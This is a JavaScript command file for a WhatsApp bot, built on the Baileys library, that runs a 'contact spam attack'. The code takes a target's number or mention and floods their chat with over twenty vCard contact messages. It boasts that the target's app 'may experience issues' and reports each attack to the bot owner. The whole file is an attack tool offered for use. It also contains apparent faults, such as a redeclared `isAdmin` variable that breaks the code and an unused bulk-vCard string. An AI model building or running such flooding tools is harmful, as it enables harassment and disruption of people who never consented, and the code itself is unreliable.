// commands/contactspam.js - Contact Spam Attack for EVA-MINI
const { jidNormalizedUser } = require('@whiskeysockets/baileys');

module.exports = async (sock, from, msg, args, isAdmin, botData) => {
    try {
        // ============================================
        // REACTION - START
        // ============================================
        try {
            await sock.sendMessage(from, {
                react: {
                    text: '👤',
                    key: msg.key
                }
            });
        } catch (e) {}

        // ============================================
        // ADMIN/OWNER CHECK
        // ============================================
        const sender = msg.key.participant || from;
        const botNumber = jidNormalizedUser(sock.user.id);
        const isOwner = sender.includes(botNumber.split('@')[0]) || msg.key.fromMe;
        
        let isAdmin = isOwner;
        if (!isAdmin && from.endsWith('@g.us')) {
            try {
                const groupMetadata = await sock.groupMetadata(from);
                const participant = groupMetadata.participants.find(p => p.id === sender);
                isAdmin = participant && (participant.admin === 'admin' || participant.admin === 'superadmin');
            } catch (e) {
                isAdmin = false;
            }
        }

        if (!isAdmin) {
            await sock.sendMessage(from, {
                text: "❌ *Only admins/owner can use this command!*"
            });
            try {
                await sock.sendMessage(from, {
                    react: {
                        text: '⛔',
                        key: msg.key
                    }
                });
            } catch (e) {}
            return;
        }

        // ============================================
        // GET TARGET
        // ============================================
        let target;
        const q = args.join(' ');
        const mentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
        const quoted = msg.message?.extendedTextMessage?.contextInfo?.participant;

        if (q && q.match(/\d/)) {
            const cleanNumber = q.replace(/\D/g, '');
            target = jidNormalizedUser(cleanNumber + '@s.whatsapp.net');
        } else if (mentioned) {
            target = mentioned;
        } else if (quoted) {
            target = quoted;
        } else {
            await sock.sendMessage(from, {
                text: `⚠️ *Usage:* .contactspam [@mention] or reply to user\n\n📌 *Example:* .contactspam @94703945265\n\n👤 *Send contact spam to target!*`
            });
            try {
                await sock.sendMessage(from, {
                    react: {
                        text: 'ℹ️',
                        key: msg.key
                    }
                });
            } catch (e) {}
            return;
        }

        // ============================================
        // STATUS MESSAGE
        // ============================================
        const targetNumber = target.split('@')[0];
        const statusMsg = await sock.sendMessage(from, {
            text: `👤 *Sending contact spam to @${targetNumber}...*\n\n⏳ Please wait...`,
            mentions: [target]
        });

        try {
            await sock.sendMessage(from, {
                react: {
                    text: '⏳',
                    key: msg.key
                }
            });
        } catch (e) {}

        // ============================================
        // SEND CONTACT SPAM
        // ============================================
        let successCount = 0;
        let totalMessages = 20;

        const contactNames = [
            'John Doe', 'Jane Smith', 'Michael Brown', 'Sarah Wilson',
            'David Lee', 'Emma Taylor', 'James Anderson', 'Lisa Thomas',
            'Robert Martin', 'Maria Garcia', 'William Johnson', 'Patricia Davis',
            'Richard Miller', 'Jennifer Jones', 'Charles Wilson', 'Linda Moore',
            'Thomas Taylor', 'Barbara Anderson', 'Christopher Thomas', 'Jessica White',
            'Daniel Harris', 'Sarah Martin', 'Matthew Thompson', 'Karen Garcia',
            'Anthony Martinez', 'Lisa Robinson', 'Mark Clark', 'Nancy Rodriguez',
            'Donald Lewis', 'Betty Lee', 'Steven Walker', 'Helen Hall',
            'Kenneth Allen', 'Donna Young', 'George King', 'Barbara Wright',
            'Edward Lopez', 'Susan Hill', 'Brian Scott', 'Margaret Green'
        ];

        const randomNames = contactNames.slice(0, totalMessages);

        for (let i = 0; i < totalMessages; i++) {
            try {
                const name = randomNames[i] || `Contact ${i + 1}`;
                const phoneNum = 1000000000 + i;
                
                // Create vCard
                const vcard = `BEGIN:VCARD\nVERSION:3.0\nFN:${name}\nN:${name};;;\nTEL;waid=${phoneNum}:+${phoneNum}\nEND:VCARD`;
                
                // Send contact message with multiple contacts
                await sock.sendMessage(target, {
                    contacts: {
                        displayName: `${name}`,
                        contacts: [{
                            vcard: vcard
                        }]
                    }
                });
                successCount++;
                
                // Small delay between messages
                await new Promise(resolve => setTimeout(resolve, 300));
            } catch (e) {
                console.log(`Contact spam ${i + 1} failed:`, e.message);
            }
        }

        // ============================================
        // SEND BULK CONTACT MESSAGES
        // ============================================
        try {
            // Send multiple contacts in one message
            let bulkVcards = '';
            for (let i = 0; i < 5; i++) {
                const name = `Bulk ${i + 1}`;
                const phoneNum = 2000000000 + i;
                bulkVcards += `BEGIN:VCARD\nVERSION:3.0\nFN:${name}\nTEL;waid=${phoneNum}:+${phoneNum}\nEND:VCARD\n`;
            }
            
            await sock.sendMessage(target, {
                contacts: {
                    displayName: 'Bulk Contacts',
                    contacts: [
                        { vcard: `BEGIN:VCARD\nVERSION:3.0\nFN:Bulk Contact 1\nTEL;waid=1000000000:+1000000000\nEND:VCARD` },
                        { vcard: `BEGIN:VCARD\nVERSION:3.0\nFN:Bulk Contact 2\nTEL;waid=1000000001:+1000000001\nEND:VCARD` },
                        { vcard: `BEGIN:VCARD\nVERSION:3.0\nFN:Bulk Contact 3\nTEL;waid=1000000002:+1000000002\nEND:VCARD` }
                    ]
                }
            });
            successCount += 3;
        } catch (e) {
            console.log('Bulk contact spam failed:', e.message);
        }

        // ============================================
        // SUCCESS MESSAGE
        // ============================================
        await sock.sendMessage(from, {
            text: `👤 *Contact spam delivered!*\n\n📱 *Target:* @${targetNumber}\n📊 *Contacts:* ${successCount} sent\n💥 *Status:* SUCCESS\n\n⚠️ *Target's WhatsApp may experience issues!*`,
            mentions: [target]
        });

        // ============================================
        // FINAL REACTION
        // ============================================
        try {
            await sock.sendMessage(from, {
                react: {
                    text: '✅',
                    key: msg.key
                }
            });
        } catch (e) {}

        // ============================================
        // DELETE STATUS MESSAGE
        // ============================================
        try {
            await new Promise(resolve => setTimeout(resolve, 3000));
            await sock.sendMessage(from, {
                delete: statusMsg.key
            });
        } catch (e) {}

        // ============================================
        // OWNER REPORT
        // ============================================
        try {
            await sock.sendMessage(botNumber, {
                text: `👤 *Contact Spam Report*\n\n📱 *Target:* @${targetNumber}\n👤 *By:* ${msg.pushName || 'Unknown'}\n📊 *Contacts:* ${successCount}\n✅ *Status:* SUCCESS\n🕐 *Time:* ${new Date().toLocaleString()}`,
                mentions: [target]
            });
        } catch (e) {}

    } catch (error) {
        console.error('Contact spam error:', error);
        try {
            await sock.sendMessage(from, {
                react: {
                    text: '❌',
                    key: msg.key
                }
            });
        } catch (e) {}
        await sock.sendMessage(from, {
            text: `❌ *Error:* ${error.message}`
        });
    }
};